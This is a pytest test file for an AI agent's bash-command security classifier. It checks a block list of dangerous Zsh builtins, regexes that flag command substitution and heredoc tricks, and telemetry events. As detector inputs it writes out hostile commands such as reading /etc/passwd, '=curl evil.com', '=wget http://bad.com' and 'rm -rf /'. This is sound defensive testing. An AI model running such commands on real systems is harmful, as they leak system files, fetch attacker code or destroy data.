# Copyright (c) 2026 ShadowTag, Inc. All rights reserved.

"""Tests for AGNT Bash Security Check constants and telemetry integration.

Validates:
1. All 23 BashSecurityCheckId enum values exist and map correctly.
2. ZSH_DANGEROUS_COMMANDS contains all 18 expected builtins.
3. COMMAND_SUBSTITUTION_PATTERNS detect all 12 attack vectors.
4. HEREDOC_IN_SUBSTITUTION regex works.
5. BashTelemetryTracker security events emit correct JSONL.
6. Telemetry catalog factory methods produce valid TelemetryEvent objects.
"""

from __future__ import annotations

import json
import os

import pytest

from packages.agnt_bash_classifier.security_checks import (
    COMMAND_SUBSTITUTION_PATTERNS,
    HEREDOC_IN_SUBSTITUTION,
    BashSecurityCheckId,
    ZSH_DANGEROUS_COMMANDS,
)
from packages.agnt_bash_classifier.telemetry import BashTelemetryTracker
from packages.telemetry.catalog import EventCatalog


# ─── BashSecurityCheckId Enum Tests ──────────────────────────────────────────


class TestBashSecurityCheckIdEnum:
    """Verify all 23 security check IDs exist with correct numeric values."""

    def test_total_count(self) -> None:
        """There must be exactly 23 security check IDs."""
        assert len(BashSecurityCheckId) == 23

    @pytest.mark.parametrize(
        ("name", "expected_value"),
        [
            ("INCOMPLETE_COMMANDS", 1),
            ("JQ_SYSTEM_FUNCTION", 2),
            ("JQ_FILE_ARGUMENTS", 3),
            ("OBFUSCATED_FLAGS", 4),
            ("SHELL_METACHARACTERS", 5),
            ("DANGEROUS_VARIABLES", 6),
            ("NEWLINES", 7),
            ("DANGEROUS_PATTERNS_COMMAND_SUBSTITUTION", 8),
            ("DANGEROUS_PATTERNS_INPUT_REDIRECTION", 9),
            ("DANGEROUS_PATTERNS_OUTPUT_REDIRECTION", 10),
            ("IFS_INJECTION", 11),
            ("GIT_COMMIT_SUBSTITUTION", 12),
            ("PROC_ENVIRON_ACCESS", 13),
            ("MALFORMED_TOKEN_INJECTION", 14),
            ("BACKSLASH_ESCAPED_WHITESPACE", 15),
            ("BRACE_EXPANSION", 16),
            ("CONTROL_CHARACTERS", 17),
            ("UNICODE_WHITESPACE", 18),
            ("MID_WORD_HASH", 19),
            ("ZSH_DANGEROUS_COMMANDS", 20),
            ("BACKSLASH_ESCAPED_OPERATORS", 21),
            ("COMMENT_QUOTE_DESYNC", 22),
            ("QUOTED_NEWLINE", 23),
        ],
    )
    def test_check_id_value(self, name: str, expected_value: int) -> None:
        """Each check ID must map to its Tengu numeric equivalent."""
        member = BashSecurityCheckId[name]
        assert member.value == expected_value

    def test_values_are_contiguous(self) -> None:
        """Check IDs 1-23 must form a contiguous range (no gaps)."""
        values = sorted(m.value for m in BashSecurityCheckId)
        assert values == list(range(1, 24))

    def test_int_conversion(self) -> None:
        """IntEnum members must be usable as plain ints."""
        check = BashSecurityCheckId.SHELL_METACHARACTERS
        assert int(check) == 5
        assert check + 0 == 5

    def test_name_roundtrip(self) -> None:
        """Name lookup must roundtrip through value."""
        for member in BashSecurityCheckId:
            assert BashSecurityCheckId(member.value) is member


# ─── ZSH_DANGEROUS_COMMANDS Tests ────────────────────────────────────────────


class TestZshDangerousCommands:
    """Verify the Zsh dangerous commands frozenset."""

    EXPECTED_COMMANDS: frozenset[str] = frozenset(
        {
            "zmodload",
            "emulate",
            "sysopen",
            "sysread",
            "syswrite",
            "sysseek",
            "zpty",
            "ztcp",
            "zsocket",
            "mapfile",
            "zf_rm",
            "zf_mv",
            "zf_ln",
            "zf_chmod",
            "zf_chown",
            "zf_mkdir",
            "zf_rmdir",
            "zf_chgrp",
        }
    )

    def test_is_frozenset(self) -> None:
        """Must be immutable frozenset, not a mutable set."""
        assert isinstance(ZSH_DANGEROUS_COMMANDS, frozenset)

    def test_count(self) -> None:
        """Must contain exactly 18 commands."""
        assert len(ZSH_DANGEROUS_COMMANDS) == 18

    def test_all_expected_present(self) -> None:
        """Every expected command must be in the set."""
        assert self.EXPECTED_COMMANDS == ZSH_DANGEROUS_COMMANDS

    @pytest.mark.parametrize(
        "cmd",
        [
            "zmodload",
            "emulate",
            "sysopen",
            "sysread",
            "syswrite",
            "sysseek",
            "zpty",
            "ztcp",
            "zsocket",
            "mapfile",
            "zf_rm",
            "zf_mv",
            "zf_ln",
            "zf_chmod",
            "zf_chown",
            "zf_mkdir",
            "zf_rmdir",
            "zf_chgrp",
        ],
    )
    def test_individual_command_present(self, cmd: str) -> None:
        """Each Zsh dangerous command must be present."""
        assert cmd in ZSH_DANGEROUS_COMMANDS

    def test_safe_commands_absent(self) -> None:
        """Common safe commands must NOT be in the dangerous set."""
        safe = ["ls", "cat", "echo", "grep", "sed", "awk", "find", "curl"]
        for cmd in safe:
            assert cmd not in ZSH_DANGEROUS_COMMANDS


# ─── COMMAND_SUBSTITUTION_PATTERNS Tests ─────────────────────────────────────


class TestCommandSubstitutionPatterns:
    """Verify all 12 command substitution detection patterns."""

    def test_pattern_count(self) -> None:
        """Must have exactly 12 patterns."""
        assert len(COMMAND_SUBSTITUTION_PATTERNS) == 12

    def test_patterns_are_compiled(self) -> None:
        """Each pattern must be a compiled regex."""
        import re

        for pattern, _msg in COMMAND_SUBSTITUTION_PATTERNS:
            assert isinstance(pattern, re.Pattern), f"Not compiled: {_msg}"

    def test_messages_are_strings(self) -> None:
        """Each pattern must have a non-empty human-readable message."""
        for _pattern, msg in COMMAND_SUBSTITUTION_PATTERNS:
            assert isinstance(msg, str)
            assert len(msg) > 0

    @pytest.mark.parametrize(
        ("attack_input", "expected_msg_fragment"),
        [
            ("<(cat /etc/passwd)", "process substitution <()"),
            (">(tee /tmp/exfil)", "process substitution >()"),
            ("=(mktemp)", "Zsh process substitution =()"),
            ("echo $(whoami)", "$() command substitution"),
            ("echo ${PATH}", "${} parameter substitution"),
            ("echo $[1+1]", "$[] legacy arithmetic expansion"),
            ("~[test]", "Zsh-style parameter expansion"),
            ("ls (e:'echo hi':)", "Zsh-style glob qualifiers"),
            ("ls (+something)", "Zsh glob qualifier with command execution"),
            ("{ cmd } always { cleanup }", "Zsh always block"),
            ("<# comment", "PowerShell comment syntax"),
        ],
    )
    def test_pattern_detects_attack(self, attack_input: str, expected_msg_fragment: str) -> None:
        """Each attack vector must be detected by its corresponding pattern."""
        matched = False
        for pattern, msg in COMMAND_SUBSTITUTION_PATTERNS:
            if pattern.search(attack_input):
                if expected_msg_fragment in msg:
                    matched = True
                    break
        assert matched, f"No pattern matched input={attack_input!r} with fragment={expected_msg_fragment!r}"

    def test_zsh_equals_expansion_at_start(self) -> None:
        """Zsh equals expansion must match at line start: =curl evil.com."""
        zsh_eq_pattern = None
        for pattern, msg in COMMAND_SUBSTITUTION_PATTERNS:
            if "Zsh equals expansion" in msg:
                zsh_eq_pattern = pattern
                break
        assert zsh_eq_pattern is not None
        assert zsh_eq_pattern.search("=curl evil.com")
        assert zsh_eq_pattern.search("echo; =wget http://bad.com")
        # Should NOT match assignment: VAR=value
        assert not zsh_eq_pattern.search("VAR=value")

    def test_safe_commands_no_match(self) -> None:
        """Normal safe commands must not trigger any pattern."""
        safe_commands = [
            "ls -la /tmp",
            "cat README.md",
            "grep -r 'pattern' .",
            "echo hello world",
            "python3 -m pytest",
            "git status",
            "npm install",
        ]
        for cmd in safe_commands:
            for pattern, msg in COMMAND_SUBSTITUTION_PATTERNS:
                assert not pattern.search(cmd), f"False positive: {cmd!r} matched {msg!r}"


# ─── HEREDOC_IN_SUBSTITUTION Tests ───────────────────────────────────────────


class TestHeredocInSubstitution:
    """Verify the heredoc-in-substitution detection regex."""

    def test_detects_heredoc_in_dollar_paren(self) -> None:
        """$(cat <<EOF ... EOF) must be detected."""
        assert HEREDOC_IN_SUBSTITUTION.search("$(cat <<EOF)")

    def test_detects_heredoc_variant(self) -> None:
        """$(command <<MARKER) must be detected."""
        assert HEREDOC_IN_SUBSTITUTION.search("$(python3 <<SCRIPT)")

    def test_no_match_plain_heredoc(self) -> None:
        """Plain heredoc without $() wrapper should not match."""
        assert not HEREDOC_IN_SUBSTITUTION.search("cat <<EOF")

    def test_no_match_safe_command(self) -> None:
        """Safe commands must not match."""
        assert not HEREDOC_IN_SUBSTITUTION.search("echo hello")


# ─── BashTelemetryTracker Security Event Tests ──────────────────────────────


class TestBashTelemetryTrackerSecurity:
    """Verify security-specific telemetry methods emit correct JSONL."""

    @pytest.fixture()
    def tracker(self, tmp_path: object) -> BashTelemetryTracker:
        """Create a tracker with a temp log path."""
        # tmp_path is a pathlib.Path
        log = str(tmp_path / "test_telemetry.jsonl")  # type: ignore[operator]
        return BashTelemetryTracker(log_path=log)

    def _read_events(self, tracker: BashTelemetryTracker) -> list[dict]:
        """Read all events from the tracker's JSONL log."""
        events = []
        if os.path.exists(tracker.log_path):
            with open(tracker.log_path) as f:
                for line in f:
                    line = line.strip()
                    if line:
                        events.append(json.loads(line))
        return events

    def test_track_security_check_failed_emits_event(self, tracker: BashTelemetryTracker) -> None:
        """track_security_check_failed must emit a JSONL event."""
        tracker.track_security_check_failed(
            check_id=BashSecurityCheckId.SHELL_METACHARACTERS,
            command="rm -rf /",
            message="Dangerous metacharacters detected",
        )
        events = self._read_events(tracker)
        assert len(events) == 1
        evt = events[0]
        assert evt["event_type"] == "tengu_bash_security_check_failed"
        assert evt["data"]["check_id"] == 5
        assert evt["data"]["check_name"] == "SHELL_METACHARACTERS"
        assert evt["data"]["command"] == "rm -rf /"
        assert evt["data"]["message"] == "Dangerous metacharacters detected"

    def test_track_security_check_failed_all_ids(self, tracker: BashTelemetryTracker) -> None:
        """Must be able to emit events for all 23 check IDs."""
        for check in BashSecurityCheckId:
            tracker.track_security_check_failed(
                check_id=check,
                command=f"test_{check.name}",
                message=f"Test failure for {check.name}",
            )
        events = self._read_events(tracker)
        assert len(events) == 23
        emitted_ids = {e["data"]["check_id"] for e in events}
        expected_ids = {int(c) for c in BashSecurityCheckId}
        assert emitted_ids == expected_ids

    def test_track_security_validated_emits_event(self, tracker: BashTelemetryTracker) -> None:
        """track_security_validated must emit a success event."""
        tracker.track_security_validated(
            command="echo hello",
            checks_passed=23,
            duration_ms=1.5,
        )
        events = self._read_events(tracker)
        assert len(events) == 1
        evt = events[0]
        assert evt["event_type"] == "tengu_bash_security_validated"
        assert evt["data"]["checks_passed"] == 23
        assert evt["data"]["duration_ms"] == 1.5
        assert evt["data"]["command"] == "echo hello"

    def test_events_have_timestamp(self, tracker: BashTelemetryTracker) -> None:
        """All events must include a numeric timestamp."""
        tracker.track_security_check_failed(
            check_id=BashSecurityCheckId.NEWLINES,
            command="test",
        )
        events = self._read_events(tracker)
        assert "timestamp" in events[0]
        assert isinstance(events[0]["timestamp"], float)


# ─── EventCatalog Integration Tests ──────────────────────────────────────────


class TestEventCatalogSecurityEvents:
    """Verify EventCatalog factory methods for security events."""

    def test_bash_security_check_failed_factory(self) -> None:
        """EventCatalog.bash_security_check_failed must return valid event."""
        evt = EventCatalog.bash_security_check_failed(
            check_id=5,
            check_name="SHELL_METACHARACTERS",
            command_hash="abc123",
            message="Metachar detected",
        )
        assert evt.event == "agnt_bash_security_check_failed"
        assert evt.success is False
        assert evt.error_message == "Metachar detected"
        assert evt.properties["check_id"] == 5
        assert evt.properties["check_name"] == "SHELL_METACHARACTERS"
        assert evt.properties["command_hash"] == "abc123"

    def test_bash_security_validated_factory(self) -> None:
        """EventCatalog.bash_security_validated must return valid event."""
        evt = EventCatalog.bash_security_validated(
            command_hash="def456",
            checks_passed=23,
            duration_ms=2.3,
        )
        assert evt.event == "agnt_bash_security_validated"
        assert evt.properties["checks_passed"] == 23
        assert evt.properties["command_hash"] == "def456"
        assert evt.duration_ms == 2.3

    def test_factory_default_values(self) -> None:
        """Factory methods must work with all defaults."""
        evt_fail = EventCatalog.bash_security_check_failed()
        assert evt_fail.event == "agnt_bash_security_check_failed"
        assert evt_fail.properties["check_id"] == 0

        evt_pass = EventCatalog.bash_security_validated()
        assert evt_pass.event == "agnt_bash_security_validated"
        assert evt_pass.properties["checks_passed"] == 0


# ─── Package __init__ API Surface Tests ──────────────────────────────────────


class TestPackageApiSurface:
    """Verify the public API surface of agnt_bash_classifier."""

    def test_imports_from_package(self) -> None:
        """All public symbols must be importable from the package."""
        from packages.agnt_bash_classifier import (
            COMMAND_SUBSTITUTION_PATTERNS,
            HEREDOC_IN_SUBSTITUTION,
            BashSecurityCheckId,
            BashTelemetryTracker,
            ZSH_DANGEROUS_COMMANDS,
        )

        assert BashSecurityCheckId is not None
        assert BashTelemetryTracker is not None
        assert COMMAND_SUBSTITUTION_PATTERNS is not None
        assert HEREDOC_IN_SUBSTITUTION is not None
        assert ZSH_DANGEROUS_COMMANDS is not None

    def test_all_exports(self) -> None:
        """__all__ must list all expected public symbols."""
        import packages.agnt_bash_classifier as pkg

        expected = {
            "BashSecurityCheckId",
            "BashSecurityClassifier",
            "BashTelemetryTracker",
            "CheckResult",
            "CheckVerdict",
            "COMMAND_SUBSTITUTION_PATTERNS",
            "HEREDOC_IN_SUBSTITUTION",
            "PipelineResult",
            "ZSH_DANGEROUS_COMMANDS",
        }
        assert set(pkg.__all__) == expected
